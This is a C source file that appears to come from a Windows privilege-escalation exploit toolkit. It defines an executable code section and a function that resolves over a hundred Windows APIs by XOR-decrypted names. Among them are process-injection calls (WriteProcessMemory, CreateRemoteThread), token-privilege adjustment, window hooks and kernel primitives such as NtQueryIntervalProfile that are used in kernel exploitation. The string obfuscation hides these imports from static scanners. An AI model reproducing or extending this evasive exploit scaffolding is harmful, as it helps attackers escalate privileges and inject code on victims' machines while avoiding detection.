#include "ApiStub.h"
#include "EopUtilsType.h"
#include "EggTag.h"
#include "WinApiWrapper.h"
#include "crt.h"

#pragma section("wineop", read, execute)
#pragma code_seg("wineop")

#define LOAD_ENCODED_LIB(name) HMODULE h##name = lpVtable->LoadLibraryA(DecryptString(lpString->str##name, sizeof(lpString->str##name), XOR_KEY)); if (h##name == NULL) return FALSE;hModule=h##name;
#define GET_ENCODED_FUNCTION(hmodule, name, fptype) lpVtable->##name =(fptype)lpVtable->GetProcAddress(hmodule, DecryptString(lpString->str##name, sizeof(lpString->str##name), XOR_KEY)); if (lpVtable->##name == NULL) return FALSE;
//#define GET_FUNCTION(hmodule, name, fptype) lpVtable->##name =(fptype)lpVtable->GetProcAddress(hmodule, (LPCSTR)str##name); if (lpVtable->##name == NULL) return FALSE;

BOOL WINAPI GetFunctionStub( __in HMODULE hKernel32, __inout LPENVIRONMENT environment)
{
	LPWINAPI_TABLE lpVtable = environment->lpWinapiTable;
	STRING_TABLE * lpString = environment->lpString;
	HMODULE hModule = NULL;
	hModule = hKernel32;

	// -- [Auto generated] BEGIN --
GET_ENCODED_FUNCTION(hModule, LoadLibraryA, LOADLIBRARYA);
GET_ENCODED_FUNCTION(hModule, LoadLibraryW, LOADLIBRARYW);
GET_ENCODED_FUNCTION(hModule, LoadLibraryExA, LOADLIBRARYEXA);
GET_ENCODED_FUNCTION(hModule, GetProcAddress, GETPROCADDRESS);
GET_ENCODED_FUNCTION(hModule, VirtualProtect, VIRTUALPROTECT);
GET_ENCODED_FUNCTION(hModule, VirtualQuery, VIRTUALQUERY);
GET_ENCODED_FUNCTION(hModule, VirtualAlloc, VIRTUALALLOC);
GET_ENCODED_FUNCTION(hModule, VirtualFree, VIRTUALFREE);
GET_ENCODED_FUNCTION(hModule, IsWow64Process, ISWOW64PROCESS);
GET_ENCODED_FUNCTION(hModule, CreateToolhelp32Snapshot, CREATETOOLHELP32SNAPSHOT);
GET_ENCODED_FUNCTION(hModule, Process32FirstW, PROCESS32FIRSTW);
GET_ENCODED_FUNCTION(hModule, Process32NextW, PROCESS32NEXTW);
GET_ENCODED_FUNCTION(hModule, CloseHandle, CLOSEHANDLE);
GET_ENCODED_FUNCTION(hModule, GetCurrentProcessId, GETCURRENTPROCESSID);
GET_ENCODED_FUNCTION(hModule, ExpandEnvironmentStringsA, EXPANDENVIRONMENTSTRINGSA);
GET_ENCODED_FUNCTION(hModule, CreateProcessA, CREATEPROCESSA);
GET_ENCODED_FUNCTION(hModule, GetVersionExA, GETVERSIONEXA);
GET_ENCODED_FUNCTION(hModule, GetCurrentProcess, GETCURRENTPROCESS);
GET_ENCODED_FUNCTION(hModule, GlobalAlloc, GLOBALALLOC);
GET_ENCODED_FUNCTION(hModule, GetModuleHandleA, GETMODULEHANDLEA);
GET_ENCODED_FUNCTION(hModule, GlobalFree, GLOBALFREE);
GET_ENCODED_FUNCTION(hModule, FreeLibrary, FREELIBRARY);
GET_ENCODED_FUNCTION(hModule, SetLastError, SETLASTERROR);
GET_ENCODED_FUNCTION(hModule, GetLastError, GETLASTERROR);
GET_ENCODED_FUNCTION(hModule, IsBadReadPtr, ISBADREADPTR);
GET_ENCODED_FUNCTION(hModule, GetCurrentThreadId, GETCURRENTTHREADID);
#ifdef _M_IX86
GET_ENCODED_FUNCTION(hModule, InterlockedExchange, INTERLOCKEDEXCHANGE);
#endif
GET_ENCODED_FUNCTION(hModule, DeviceIoControl, DEVICEIOCONTROL);
GET_ENCODED_FUNCTION(hModule, CreateIoCompletionPort, CREATEIOCOMPLETIONPORT);
GET_ENCODED_FUNCTION(hModule, OpenProcess, OPENPROCESS);
GET_ENCODED_FUNCTION(hModule, VirtualAllocEx, VIRTUALALLOCEX);
GET_ENCODED_FUNCTION(hModule, WriteProcessMemory, WRITEPROCESSMEMORY);
GET_ENCODED_FUNCTION(hModule, CreateRemoteThread, CREATEREMOTETHREAD);
GET_ENCODED_FUNCTION(hModule, WaitForSingleObject, WAITFORSINGLEOBJECT);
GET_ENCODED_FUNCTION(hModule, TerminateThread, TERMINATETHREAD);
GET_ENCODED_FUNCTION(hModule, VirtualFreeEx, VIRTUALFREEEX);
GET_ENCODED_FUNCTION(hModule, Sleep, SLEEP);
GET_ENCODED_FUNCTION(hModule, GetComputerNameA, GETCOMPUTERNAMEA);
LOAD_ENCODED_LIB(Advapi32);
GET_ENCODED_FUNCTION(hModule, RegOpenKeyExA, REGOPENKEYEXA);
GET_ENCODED_FUNCTION(hModule, RegQueryValueExA, REGQUERYVALUEEXA);
GET_ENCODED_FUNCTION(hModule, RegCloseKey, REGCLOSEKEY);
GET_ENCODED_FUNCTION(hModule, OpenProcessToken, OPENPROCESSTOKEN);
GET_ENCODED_FUNCTION(hModule, LookupPrivilegeValueA, LOOKUPPRIVILEGEVALUEA);
GET_ENCODED_FUNCTION(hModule, AdjustTokenPrivileges, ADJUSTTOKENPRIVILEGES);
LOAD_ENCODED_LIB(user32_dll);
GET_ENCODED_FUNCTION(hModule, RegisterClassA, REGISTERCLASSA);
GET_ENCODED_FUNCTION(hModule, RegisterClassExA, REGISTERCLASSEXA);
GET_ENCODED_FUNCTION(hModule, CreateWindowExA, CREATEWINDOWEXA);
GET_ENCODED_FUNCTION(hModule, UnregisterClassA, UNREGISTERCLASSA);
GET_ENCODED_FUNCTION(hModule, DestroyWindow, DESTROYWINDOW);
GET_ENCODED_FUNCTION(hModule, SetWindowsHookExA, SETWINDOWSHOOKEXA);
GET_ENCODED_FUNCTION(hModule, SetForegroundWindow, SETFOREGROUNDWINDOW);
GET_ENCODED_FUNCTION(hModule, TrackPopupMenu, TRACKPOPUPMENU);
GET_ENCODED_FUNCTION(hModule, PostMessageA, POSTMESSAGEA);
GET_ENCODED_FUNCTION(hModule, UnhookWindowsHook, UNHOOKWINDOWSHOOK);
GET_ENCODED_FUNCTION(hModule, DestroyMenu, DESTROYMENU);
GET_ENCODED_FUNCTION(hModule, SetWindowLongA, SETWINDOWLONGA);
GET_ENCODED_FUNCTION(hModule, CallNextHookEx, CALLNEXTHOOKEX);
GET_ENCODED_FUNCTION(hModule, CreatePopupMenu, CREATEPOPUPMENU);
GET_ENCODED_FUNCTION(hModule, InsertMenuItemA, INSERTMENUITEMA);
GET_ENCODED_FUNCTION(hModule, CallWindowProcA, CALLWINDOWPROCA);
GET_ENCODED_FUNCTION(hModule, EndMenu, ENDMENU);
GET_ENCODED_FUNCTION(hModule, DefWindowProcA, DEFWINDOWPROCA);
GET_ENCODED_FUNCTION(hModule, LoadIconA, LOADICONA);
GET_ENCODED_FUNCTION(hModule, SetClassLongA, SETCLASSLONGA);
GET_ENCODED_FUNCTION(hModule, EnumPropsExA, ENUMPROPSEXA);
GET_ENCODED_FUNCTION(hModule, RemovePropA, REMOVEPROPA);
GET_ENCODED_FUNCTION(hModule, wsprintfA, WSPRINTFA);
GET_ENCODED_FUNCTION(hModule, SetPropA, SETPROPA);
GET_ENCODED_FUNCTION(hModule, CreateAcceleratorTableW, CREATEACCELERATORTABLEW);
GET_ENCODED_FUNCTION(hModule, VkKeyScanA, VKKEYSCANA);
GET_ENCODED_FUNCTION(hModule, SendInput, SENDINPUT);
GET_ENCODED_FUNCTION(hModule, SendMessageW, SENDMESSAGEW);
GET_ENCODED_FUNCTION(hModule, SetFocus, SETFOCUS);
GET_ENCODED_FUNCTION(hModule, AppendMenuA, APPENDMENUA);
GET_ENCODED_FUNCTION(hModule, SetWinEventHook, SETWINEVENTHOOK);
GET_ENCODED_FUNCTION(hModule, TrackPopupMenuEx, TRACKPOPUPMENUEX);
GET_ENCODED_FUNCTION(hModule, PostMessageW, POSTMESSAGEW);
GET_ENCODED_FUNCTION(hModule, GetMessageW, GETMESSAGEW);
GET_ENCODED_FUNCTION(hModule, DispatchMessageW, DISPATCHMESSAGEW);
GET_ENCODED_FUNCTION(hModule, TranslateMessage, TRANSLATEMESSAGE);
GET_ENCODED_FUNCTION(hModule, LoadCursorA, LOADCURSORA);
GET_ENCODED_FUNCTION(hModule, PostQuitMessage, POSTQUITMESSAGE);
GET_ENCODED_FUNCTION(hModule, EnumDisplayDevicesA, ENUMDISPLAYDEVICESA);
LOAD_ENCODED_LIB(Ws2_32_dll);
GET_ENCODED_FUNCTION(hModule, WSAStartup, WSASTARTUP);
GET_ENCODED_FUNCTION(hModule, WSACleanup, WSACLEANUP);
GET_ENCODED_FUNCTION(hModule, socket, FP_SOCKET);
GET_ENCODED_FUNCTION(hModule, closesocket, CLOSESOCKET);
GET_ENCODED_FUNCTION(hModule, connect, CONNECT);
LOAD_ENCODED_LIB(shell32_dll);
GET_ENCODED_FUNCTION(hModule, ShellExecuteA, SHELLEXECUTEA);
LOAD_ENCODED_LIB(Gdi32_dll);
GET_ENCODED_FUNCTION(hModule, CreateRoundRectRgn, CREATEROUNDRECTRGN);
LOAD_ENCODED_LIB(Ntdll_dll);
GET_ENCODED_FUNCTION(hModule, ZwQuerySystemInformation, ZWQUERYSYSTEMINFORMATION);
GET_ENCODED_FUNCTION(hModule, ZwAllocateVirtualMemory, ZWALLOCATEVIRTUALMEMORY);
GET_ENCODED_FUNCTION(hModule, NtCreateWorkerFactory, NTCREATEWORKERFACTORY);
GET_ENCODED_FUNCTION(hModule, NtSetInformationWorkerFactory, NTSETINFORMATIONWORKERFACTORY);
GET_ENCODED_FUNCTION(hModule, NtQueryInformationWorkerFactory, NTQUERYINFORMATIONWORKERFACTORY);
GET_ENCODED_FUNCTION(hModule, NtQueryEaFile, NTQUERYEAFILE);
GET_ENCODED_FUNCTION(hModule, NtQueryIntervalProfile, NTQUERYINTERVALPROFILE);
	// -- [Auto generated] END --
	return TRUE;
}